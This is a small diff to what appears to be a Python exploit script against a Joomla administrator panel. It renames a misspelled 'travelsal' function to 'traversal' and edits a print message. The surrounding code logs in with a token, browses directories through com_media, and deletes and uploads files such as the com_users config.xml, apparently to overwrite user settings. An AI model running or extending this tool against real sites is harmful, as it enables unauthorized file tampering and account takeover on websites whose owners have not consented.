@@ -350,7 +350,7 @@ def extact_token(resp):
 
 def login(session, url, uname, passwd):
     admin_panel = url + '/administrator/index.php'
-    print('\033[32m[+] Getting token for login. \033[0m')
+    print('[*] Getting token for login.')
     resp = session.get(admin_panel, verify=True)
     token = extact_token(resp)
     if not token:
@@ -406,7 +406,7 @@ def set_options(url, session, dir, token):
         return False
     return True
 
-def travelsal(session, url):
+def traversal(session, url):
     shell = url + '/administrator/index.php?option=com_media&view=mediaList&tmpl=component&folder='
     resp = session.get(shell, verify=True)
     page = resp.text.encode('UTF-8')
@@ -493,7 +493,7 @@ def Options(url, session, usuper, psuper, esuper, token):
     dir = './administrator/components/com_users'
     filename = 'config.xml'
     set_options(url, session, dir, token)
-    travelsal(session, url)
+    traversal(session, url)
     remove_file(session, url, filename, token)
     f = open("config.xml", "rb")
     upload_file(session, url, f, token)
@@ -556,7 +556,7 @@ def main():
     token = checker(session, url)
     set_options(url, session, dir, token)
     print("[*] Directory mode: ")
-    travelsal(session, url)
+    traversal(session, url)
     if parser.parse_args().remove:
         print('\n[*] Remove file mode: ')
         filename = format(str(args['remove']))
